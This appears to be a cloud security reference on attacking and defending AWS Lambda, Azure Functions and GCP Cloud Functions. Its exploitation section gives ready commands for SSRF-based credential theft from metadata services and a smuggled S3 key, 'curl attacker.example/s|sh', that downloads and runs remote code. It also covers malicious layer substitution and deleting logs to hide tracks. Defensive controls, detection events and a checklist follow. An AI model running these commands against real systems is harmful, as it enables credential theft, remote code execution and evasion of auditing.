# Lambda and Cloud Functions Attacks

Attack techniques specific to AWS Lambda, Azure Functions and Google Cloud Functions. Focus on execution-role abuse, event injection, dependency poisoning and post-exploitation persistence.

## 1. Overview

FaaS platforms share a common shape (managed runtime, event triggers, execution role) but differ in identity, event sources and persistence primitives. This file maps the concrete techniques per platform.

Attack surface per platform:

| Platform | Identity primitive | Event sources | Persistence primitive |
|----------|--------------------|---------------|-----------------------|
| AWS Lambda | Execution role (IAM) | API Gateway, S3, SQS, SNS, EventBridge, Function URL | Lambda layer, event source mapping, alias |
| Azure Functions | Managed identity / app settings | HTTP, Storage Queue, Event Hub, Service Bus, Timer | App settings, deployment slot, extension bundle |
| GCP Cloud Functions | Service account | HTTP, Pub/Sub, Storage, Firestore, Scheduler | Cloud Scheduler job, Pub/Sub subscription, service account key |

## 2. Reconnaissance / Enumeration

### Offensive

- **AWS Lambda.** With any credential:
  ```bash
  $ aws lambda list-functions --query "Functions[].FunctionName"
  $ aws lambda get-function --function-name <name>
  $ aws lambda get-policy --function-name <name> --query Policy
  $ aws lambda list-event-source-mappings --function-name <name>
  ```
- **Azure Functions.** With any Entra ID credential:
  ```bash
  $ az functionapp list --query "[].{name:name, host:defaultHostName, state:state}"
  $ az functionapp config appsettings list -g <rg> -n <app>
  $ az functionapp identity show -g <rg> -n <app>
  ```
- **GCP Cloud Functions.** With any GCP credential:
  ```bash
  $ gcloud functions list
  $ gcloud functions describe <name> --region <region>
  $ gcloud functions get-iam-policy <name> --region <region>
  ```
- **Public endpoints.** API Gateway URLs, Lambda Function URLs, Azure Function HTTP endpoints, Cloud Run URLs. Grep JS bundles and public code for these patterns.
- **Trigger-to-permission mapping.** For each function, list the execution role/service account/managed identity. Cross-reference with `iam:PassRole`, storage bucket policies, and message queue permissions to find a foothold.

### Defensive

- Flag functions with `*` in the role policy (AWS), Contributor/Owner on the managed identity (Azure), or `roles/editor` on the service account (GCP).
- Identify event source mappings pointing to resources outside the account (S3 cross-account, SNS cross-account, Pub/Sub cross-project).
- List functions with public URLs and confirm authentication is enforced.
- Enumerate app settings/env vars and flag any that hold long-lived credentials.

## 3. Common Attack Vectors

### AWS Lambda
- Over-privileged execution role (`iam:PassRole`, `s3:*`, `sts:AssumeRole`).
- Command injection via event payloads (`shell=True` in handler).
- SSRF to IMDS via a fetch primitive in the handler.
- Layer substitution: overwrite a shared layer used by multiple functions.
- `lambda:UpdateFunctionCode` from a misconfigured CI IAM role.

### Azure Functions
- App settings expose secrets (storage account keys, SQL connection strings) to anyone with `Microsoft.Web/sites/config/list/action`.
- Managed identity with broad scope on the subscription.
- Function key leakage in code, GitHub, JS bundles.
- Dependency injection via extension bundle (function bundles pull NuGet packages at startup).

### GCP Cloud Functions
- Service account key `roles/iam.serviceAccountKeyAdmin` created via the function's identity.
- Over-permissive `run.invoker` on Cloud Run or `cloudfunctions.invoker` on Cloud Functions.
- Pub/Sub topic attack: publish a message that the function trusts.
- Storage trigger attack: write to the trigger bucket (if bucket policy allows) with a crafted object name.

## 4. Exploitation Recipes

### 4.1 AWS Lambda: SSRF to IMDS to role takeover

```python
# Vulnerable Lambda handler with user-controlled URL fetch
import urllib.request
def handler(event, context):
    url = event["queryStringParameters"]["url"]
    return urllib.request.urlopen(url).read().decode()
```

```bash
$ curl "https://abc123.lambda-url.eu-west-1.on.aws/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
lambda-exec-role
$ curl "https://abc123.lambda-url.eu-west-1.on.aws/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-exec-role"
{"AccessKeyId":"<ACCESS_KEY_ID>","SecretAccessKey":"<SECRET_ACCESS_KEY>","Token":"<SESSION_TOKEN>"}
```

Expected result: temporary credentials for the Lambda execution role.

### 4.2 AWS Lambda: Event injection via S3 metadata

```bash
# If the function interpolates the object key into a command:
$ aws s3 cp payload.sh "s3://trigger-bucket/a;curl attacker.example/s|sh;#"
```

On the next event, the function executes the crafted key.

### 4.3 AWS Lambda: Layer substitution persistence

```bash
$ aws lambda publish-layer-version --layer-name shared-utils --zip-file fileb://malicious.zip --compatible-runtimes python3.12
$ aws lambda update-function-configuration --function-name target-fn --layers arn:aws:lambda:eu-west-1:123:layer:shared-utils:2
```

Every subsequent invocation loads the attacker code.

### 4.4 Azure Functions: app settings exfiltration

```bash
# A function with managed identity that can read its own app settings:
$ curl -H "X-IDENTITY-HEADER: <header>" "http://127.0.0.1:8081/msi/token?resource=https://management.azure.com/&api-version=2019-08-01"
$ az rest --method post --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Web/sites/<app>/config/appsettings/list?api-version=2022-03-01" --headers "Authorization=Bearer <token>"
```

Expected result: JSON with connection strings and storage keys.

### 4.5 Azure Functions: function key leakage

Function keys are stored as `masterKey` and per-function keys. If exposed in client-side code or logs, they authorize HTTP trigger calls.

```bash
$ curl -H "x-functions-key: <leaked-key>" "https://<app>.azurewebsites.net/api/<function>"
```

### 4.6 GCP Cloud Functions: service account key creation

```bash
# From inside a Cloud Function with the default compute SA:
$ curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
$ gcloud iam service-accounts keys create /tmp/key.json --iam-account=<sa>@<project>.iam.gserviceaccount.com
```

If the SA has `roles/iam.serviceAccountKeyAdmin`, the key is a long-lived credential.

### 4.7 GCP Cloud Functions: Pub/Sub message injection

```bash
$ gcloud pubsub topics publish my-topic --message='{"cmd":"id"}'
```

If the function deserializes the message and passes a field to `subprocess`, command execution is trivial.

### 4.8 Cross-platform: dependency confusion

Publish a public package with the same name as an internal dependency. On the next deployment, if the version constraint accepts the public version, the attacker code runs during the build.

## 5. Post-Exploitation

- **AWS Lambda:** Persist via a new event source mapping (scheduled event with attacker payload), via Lambda layer, or via alias pointer swap to an attacker-controlled version.
- **Azure Functions:** Persist via deployment slot swap (staging slot with attacker code), via app setting change (rewrite connection strings), or via a new function deployed to the same app.
- **GCP Cloud Functions:** Persist via Cloud Scheduler job invoking an attacker-deployed function, via a new Pub/Sub subscription, or via a long-lived service account key.
- **Credential harvesting.** Function roles are often broader than user roles. Assume role from the function role, then from the assumed role to other principals, transitively.
- **Lateral movement.** Use the function role to list and read S3/GCS/Blob storage, query databases, or enumerate secrets managers.
- **Covering tracks.** Delete CloudWatch Log Groups, Azure Monitor diagnostic settings, GCP log sinks. All are logged; the deletion is auditable.

## 6. Preventive Controls

- **Least-privilege execution roles.** Function role must not have `*` actions, no `iam:*`, no `sts:AssumeRole` on `*`.
- **No long-lived credentials in code or env vars.** Use Secrets Manager, Key Vault, Secret Manager.
- **Input validation.** Treat event payloads as untrusted. Use typed schemas, not raw dicts.
- **Disable IMDS access from user-supplied fetchers.** For Lambda, IMDSv2 is the default but SSRF to IMDS still works if the function's network path allows it - restrict egress via VPC.
- **Container and layer immutability.** Deploy layers by digest, sign with AWS Signer.
- **Function keys in a secret store.** Do not commit function keys to source. Rotate on schedule.
- **Service account key creation blocked.** Organization policy to deny `iam.serviceAccountKeys.create` for default compute and appengine accounts.
- **Deployment pipeline isolation.** CI/CD role must not have `lambda:UpdateFunctionCode` on production functions without approval.

## 7. Detection Controls

- **AWS:** GuardDuty Lambda Protection, CloudTrail events for `lambda:UpdateFunctionCode`, `lambda:PublishLayerVersion`, `lambda:AddPermission` (public function URL), `lambda:CreateEventSourceMapping`.
- **Azure:** Defender for Cloud serverless protection, Activity Log for `Microsoft.Web/sites/config/write`, `Microsoft.Web/sites/host/functionKeys/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/*/assign/action`.
- **GCP:** Event Threat Detection, Cloud Audit Logs for `google.cloud.functions.v1.CloudFunctionsService.SetIamPolicy`, `google.iam.admin.v1.CreateServiceAccountKey`, `google.pubsub.v1.Publisher.Publish` from new principals.
- **Anomalous invocation patterns.** Sudden increase in concurrency, duration or cold starts across a function is an indicator of abuse.
- **Egress anomalies.** VPC Flow Logs, NSG Flow Logs, VPC Flow Logs on GCP for outbound traffic from the function subnet.

## 8. Verification

- [ ] All function roles have no `*` actions.
- [ ] No long-lived credentials in app settings or env vars.
- [ ] Function URLs require authentication.
- [ ] Event source mappings point only to same-account resources with explicit resource policies.
- [ ] Layers are deployed by digest / immutable ARN.
- [ ] Organization policies block service account key creation on default compute accounts.
- [ ] GuardDuty Lambda Protection enabled (AWS) / Defender for Cloud serverless enabled (Azure) / Event Threat Detection enabled (GCP).
- [ ] Deployment pipeline has approval gate for `UpdateFunctionCode` on production.

## 9. Certification Alignment

- **AWS Certified Security - Specialty:** Domain 1 (Incident Response), Domain 2 (Logging and Monitoring), Domain 3 (Infrastructure Security).
- **AWS Certified Solutions Architect - Associate:** Domain 2 (Resilience), Domain 3 (High-Performing Architectures).
- **Google Cloud Professional Cloud Security Engineer:** Section 3 (Configure access), Section 6 (Detect).
- **Azure Security Engineer Associate (AZ-500):** Platform protection, security operations.
- **CompTIA Security+:** Domains 2-4.

## 10. Production Notes

- **Function roles rotate every hour.** Persist the exfiltration, not the credentials.
- **Cold starts leak.** The first invocation after a new deployment initializes dependencies. A dependency confusion payload executes at cold start.
- **Log retention.** Default CloudWatch retention for Lambda is forever but expensive; many teams set 7-14 days. Extend to 90+ days for incident response.
- **Concurrency limits.** Abuse often manifests as concurrency exhaustion or a spike in invocation count. Rate-limit function concurrency in production.
- **Cost anomaly detection.** Sudden cost spikes from invocations or duration indicate abuse even without a security alert.

## 11. References

- AWS Lambda security documentation - https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html
- AWS Lambda best practices - https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html
- Azure Functions security concepts - https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts
- Azure Functions access keys - https://learn.microsoft.com/en-us/azure/azure-functions/function-keys-how-to
- Google Cloud Functions security - https://cloud.google.com/functions/docs/securing
- Google Cloud Run security - https://cloud.google.com/run/docs/securing/security-best-practices
- OWASP Serverless Top 10 - https://owasp.org/www-project-serverless-top-10/
- NIST SP 800-204A - https://csrc.nist.gov/publications/detail/sp/800-204a/final
- HackTricks Cloud - AWS Lambda - https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-lambda-enum.html
- HackTricks Cloud - Azure Functions - https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-functions.html